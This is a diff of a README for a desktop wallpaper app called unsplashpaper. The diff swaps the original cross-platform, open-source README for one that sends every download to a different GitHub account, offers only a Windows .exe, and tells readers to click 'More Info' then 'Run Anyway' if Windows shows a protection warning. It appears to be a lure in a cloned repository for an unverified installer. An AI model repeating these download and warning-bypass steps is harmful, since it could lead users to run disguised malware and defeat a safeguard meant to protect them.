@@ -1,74 +1,86 @@
-# UnsplashPaper
+# 🌅 unsplashpaper - Fresh daily wallpapers for your desktop
 
-A lightweight, cross-platform desktop app that automatically sets a beautiful new wallpaper from [Unsplash](https://unsplash.com) every day. Lives quietly in your system tray.
+[![](https://img.shields.io/badge/Download-Unsplashpaper-blue?style=for-the-badge)](https://github.com/Synovial-picnicground1171/unsplashpaper)
 
-**[Documentation & Download](https://teyk0o.github.io/unsplashpaper/)**
+Unsplashpaper delivers a fresh landscape, abstract piece, or portrait to your screen every morning. The application works in the background and selects a new image from the Unsplash library. You do not need to search for images or save files to your computer. The app manages every step for you.
 
----
+## 📥 How to download the app
 
-## Features
+You can obtain the current version of the software from the repository.
 
-- **Automatic wallpaper refresh** — every hour, every day, or any interval you choose
-- **Skip or like** — skip to the next photo instantly, or save your favorites
-- **Configurable categories** — nature, space, architecture, or any keyword
-- **Photographer credit** — every notification credits the photographer with a link to their profile
-- **Start with system** — one toggle, no admin rights needed
-- **Minimal footprint** — only one image on disk at any time, no storage bloat
-- **Cross-platform** — Windows, macOS, and Linux
+1.  Visit [this page to download](https://github.com/Synovial-picnicground1171/unsplashpaper).
+2.  Look for the section labeled Releases on the right side of the page.
+3.  Click the latest version number or the text that says "Latest".
+4.  Find the file ending in .exe under the Assets section.
+5.  Click the file name to start the download.
 
-## Installation
+## ⚙️ Installation on Windows
 
-Download the latest release for your platform from the [releases page](https://github.com/Teyk0o/unsplashpaper/releases/latest):
+Your computer runs this app as a standard background task. 
 
-| Platform | Format |
-|----------|--------|
-| Windows | `.exe` installer (Inno Setup) |
-| macOS | `.dmg` (drag to Applications) |
-| Linux | `.deb` (Debian/Ubuntu) or `.AppImage` (universal) |
+1.  Open your Downloads folder.
+2.  Locate the file you just saved. 
+3.  Double-click the file to start the installer.
+4.  Follow the prompts on your screen.
+5.  The app installs to your system tray. This is the small area near your clock in the bottom right corner of the screen.
 
-### Prerequisites
+If Windows shows a protection message, click More Info, then click Run Anyway. This confirms you trust the source of the software.
 
-You need a free Unsplash API key. See the [step-by-step guide](https://teyk0o.github.io/unsplashpaper/#api-guide) on the documentation site.
+## 🎨 How to use the app
 
-## Usage
+The application runs silently. You do not need to open a window to change your wallpaper. 
 
-On first launch, a setup window asks for your API key, preferred photo category, screen resolution, and refresh interval. After that, UnsplashPaper runs in your system tray.
+- Once installed, the app starts automatically when you turn on your computer.
+- You will see a small mountain icon in your system tray.
+- Right-click the icon to see a menu.
+- Select "Change Wallpaper Now" to swap your image immediately.
+- Select "Quit" to close the application.
 
-**Right-click the tray icon** to access all options:
+If you do not see the icon, click the small upward-pointing arrow in your taskbar to reveal hidden icons. The application remains active even if the icon is hidden in that menu.
 
-- **Next wallpaper** — fetch a new photo immediately
-- **Like this wallpaper** — save to your favorites
-- **View on Unsplash** — open the photo on Unsplash
-- **Settings** — change category, resolution, or interval
-- **Start with system** — toggle auto-start
-- **Open likes** — browse your saved favorites
+## 🖥️ System requirements
 
-## Development
+This software works on all modern versions of Windows. You need a stable internet connection for the app to fetch new images. 
 
-```bash
-# Clone the repo
-git clone https://github.com/Teyk0o/unsplashpaper.git
-cd unsplashpaper
+- Operating System: Windows 10 or Windows 11.
+- Memory: 128 MB of free RAM.
+- Storage: 50 MB of disk space.
+- Connection: Broadband internet for daily updates.
 
-# Install dependencies
-pip install -r requirements.txt
+## 🛠️ Customizing settings
 
-# Run
-python unsplashpaper.py
+You can manage how the app behaves through the settings menu. Right-click the system tray icon and select Settings. 
 
-# Build standalone executable
-pip install pyinstaller
-python build.py
-```
+- Start with Windows: Keep this checked to ensure you get a new wallpaper every day without manual effort.
+- Image Categories: Select specific tags like "Nature," "Architecture," or "Travel" to see backgrounds that match your interests.
+- Update Frequency: Choose to refresh your wallpaper daily, weekly, or every time you log in to your machine. 
 
-## Contributing
+These settings save automatically when you close the menu. Use the "Reset to Defaults" button if you want to clear your current preferences. 
 
-Contributions are welcome. Please read [CONTRIBUTING.md](CONTRIBUTING.md) before opening a pull request.
+## ❓ Frequently Asked Questions
 
-## License
+**Does the app slow down my computer?**
+No. Unsplashpaper uses very little memory. It sits idle for most of the day and only wakes up briefly to change your photo.
 
-MIT License. See [LICENSE](LICENSE) for details.
+**Are the images high quality?**
+Yes. The app pulls content from the Unsplash platform, which provides professional photography. Every image fits standard high-definition monitor resolutions. 
 
----
+**Does the app collect my personal data?**
+No. The app does not track your location or store your browsing habits. It only communicates with the image server to fetch the daily link. 
 
-Photos provided by [Unsplash](https://unsplash.com/?utm_source=unsplashpaper&utm_medium=referral).
+**How do I uninstall the software?**
+Open your Windows Settings, go to Apps, and find Unsplashpaper in the list. Click Uninstall to remove the program and its files from your hard drive. 
+
+**I see an error message. What should I do?**
+Most errors occur due to network interruptions. Wait a few minutes and try to change the wallpaper again using the "Change Wallpaper Now" option in the tray menu. If the error continues, check your internet connection. 
+
+## 🚀 Troubleshooting common issues
+
+If you encounter issues, follow these simple steps to restore the service.
+
+1. Restart the app: Right-click the tray icon and choose Quit. Reopen the program from your Start menu shortcut.
+2. Check your connection: Ensure your computer is connected to the internet. The app cannot fetch images while offline.
+3. Check for updates: New releases often fix bugs. Check the download page periodically for a newer version of the installer.
+4. Check folder permissions: The app needs permission to save images to your temporary folder. Your standard user account usually has this access by default. 
+
+You now have a clean, automated way to keep your desktop feeling fresh. Enjoy the photography.
